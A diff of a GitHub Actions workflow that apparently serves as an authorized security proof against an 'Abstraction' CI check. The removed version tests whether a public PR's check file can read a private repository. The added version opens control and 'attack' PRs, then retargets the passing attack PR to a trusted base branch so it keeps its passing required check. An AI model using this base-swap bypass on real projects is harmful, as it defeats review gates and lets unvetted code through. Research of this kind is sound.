@@ -1,129 +1,42 @@
-name: Create Abstraction check-file proof PR
-
+name: Abstraction base identity proof
 on:
   workflow_dispatch:
-
 permissions:
   contents: write
   pull-requests: write
-
+  checks: read
 jobs:
-  create-proof-pr:
+  base-proof:
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     steps:
-      - name: Create a bot-authored proof pull request
-        uses: actions/github-script@v7
+      - uses: actions/github-script@v7
         with:
           script: |
-            const { owner, repo } = context.repo;
-            const base = "main";
-            const branch = "bot-pr-check-file-exfil-20261124";
-
-            const fixture = await github.rest.repos.getContent({
-              owner,
-              repo,
-              path: ".github/proof-fixtures/public-pr-private-boundary.abstrcheck.yaml",
-              ref: base,
-            });
-            if (Array.isArray(fixture.data) || fixture.data.type !== "file") {
-              core.setFailed("The checked check-file fixture is not a file.");
-              return;
+            const {owner,repo}=context.repo;
+            const trusted="codex-base-binding-trusted-0b7e283bdec8", alternate="codex-base-binding-alternate-0b7e283bdec8", required="Abstraction \u00b7 base-diff-gate-0b7e283bdec8 \u00b7 CI base binding 0b7e283bdec8";
+            const identity={name:"github-actions[bot]",email:"41898282+github-actions[bot]@users.noreply.github.com"};
+            let attack, control;
+            for(const [kind,branch,base,parent] of [["control", "codex-base-binding-control-0b7e283bdec8", "codex-base-binding-trusted-0b7e283bdec8", "cc6304c679867d76c93ae891b818651c24568715"], ["attack", "codex-base-binding-attack-0b7e283bdec8", "codex-base-binding-alternate-0b7e283bdec8", "e53ed45dc2602199d626b8ea52629a874d32ec9a"]]){
+             const commit=await github.rest.git.createCommit({owner,repo,message:`test: base binding ${kind} `+"0b7e283bdec8",tree:"3800760797d2dac5f5acb23aa275ac7675dd1e4d",parents:[parent],author:identity,committer:identity});
+             await github.rest.git.createRef({owner,repo,ref:`refs/heads/${branch}`,sha:commit.data.sha});
+             const p=(await github.rest.pulls.create({owner,repo,title:`test: base binding ${kind} `+"0b7e283bdec8",head:branch,base,draft:false,body:"Researcher-owned synthetic base-identity test. Preserve this PR unmerged."})).data;
+             const record={number:p.number,head:commit.data.sha,base,actor:p.user.login,url:p.html_url};
+             core.notice(JSON.stringify({kind,...record}));
+             if(kind==="attack")attack=record;else control=record;
             }
-            const checkFile = Buffer.from(fixture.data.content, "base64").toString("utf8");
-
-            const files = {
-              ".abstraction/checks/public-pr-private-boundary.abstrcheck.yaml": checkFile,
-              "bot-proof-trigger.js": "export const BOT_PROOF_TRIGGER = \"synthetic-only\";\n",
-            };
-
-            const baseRef = await github.rest.git.getRef({
-              owner,
-              repo,
-              ref: `heads/${base}`,
-            });
-            const baseCommit = await github.rest.git.getCommit({
-              owner,
-              repo,
-              commit_sha: baseRef.data.object.sha,
-            });
-
-            const tree = [];
-            for (const [path, content] of Object.entries(files)) {
-              const blob = await github.rest.git.createBlob({
-                owner,
-                repo,
-                content,
-                encoding: "utf-8",
-              });
-              tree.push({ path, mode: "100644", type: "blob", sha: blob.data.sha });
+            async function waitFor(pr,conclusion){
+             for(let attempt=0;attempt<360;attempt++){
+              const runs=(await github.rest.checks.listForRef({owner,repo,ref:pr.head,filter:"all",per_page:100})).data.check_runs;
+              const run=runs.find(x=>x.app.id===2932913&&x.name===required&&x.status==="completed");
+              if(run){if(run.conclusion!==conclusion)throw new Error(`Unexpected ${conclusion} control: ${run.conclusion}`);return run;}
+              await new Promise(resolve=>setTimeout(resolve,1000));
+             }
+             throw new Error("No completed controlled Abstraction check");
             }
-
-            const newTree = await github.rest.git.createTree({
-              owner,
-              repo,
-              base_tree: baseCommit.data.tree.sha,
-              tree,
-            });
-            const identity = {
-              name: "github-actions[bot]",
-              email: "41898282+github-actions[bot]@users.noreply.github.com",
-            };
-            const commit = await github.rest.git.createCommit({
-              owner,
-              repo,
-              message: "test: bot-controlled Abstraction check file",
-              tree: newTree.data.sha,
-              parents: [baseRef.data.object.sha],
-              author: identity,
-              committer: identity,
-            });
-            let branchExists = true;
-            try {
-              await github.rest.git.getRef({ owner, repo, ref: `heads/${branch}` });
-            } catch (error) {
-              if (error.status !== 404) throw error;
-              branchExists = false;
-            }
-
-            if (branchExists) {
-              await github.rest.git.updateRef({
-                owner,
-                repo,
-                ref: `heads/${branch}`,
-                sha: commit.data.sha,
-                force: true,
-              });
-            } else {
-              await github.rest.git.createRef({
-                owner,
-                repo,
-                ref: `refs/heads/${branch}`,
-                sha: commit.data.sha,
-              });
-            }
-
-            const existing = await github.rest.pulls.list({
-              owner,
-              repo,
-              state: "open",
-              head: `${owner}:${branch}`,
-              base,
-            });
-            if (existing.data.length > 0) {
-              core.notice(`Updated ${existing.data[0].html_url}`);
-            } else {
-              const pull = await github.rest.pulls.create({
-                owner,
-                repo,
-                title: "test: public PR check cannot read a private repository",
-                head: branch,
-                base,
-                body: [
-                  "Authorized Abstraction security test.",
-                  "",
-                  "This bot token is scoped to this public proof repository.",
-                  "The check targets one synthetic value in a different researcher-owned private repository.",
-                ].join("\n"),
-              });
-              core.notice(`Created ${pull.data.html_url}`);
-            }
+            const failed=await waitFor(control,"failure");
+            const passed=await waitFor(attack,"success");
+            core.notice(JSON.stringify({kind:"before",control_check:failed.id,control_conclusion:failed.conclusion,attack_check:passed.id,attack_conclusion:passed.conclusion,head:attack.head}));
+            const changed=(await github.rest.pulls.update({owner,repo,pull_number:attack.number,base:trusted})).data;
+            if(changed.head.sha!==attack.head)throw new Error("Head changed during retarget");
+            core.notice(JSON.stringify({kind:"retargeted",number:attack.number,head:changed.head.sha,base:changed.base.ref,at:new Date().toISOString()}));
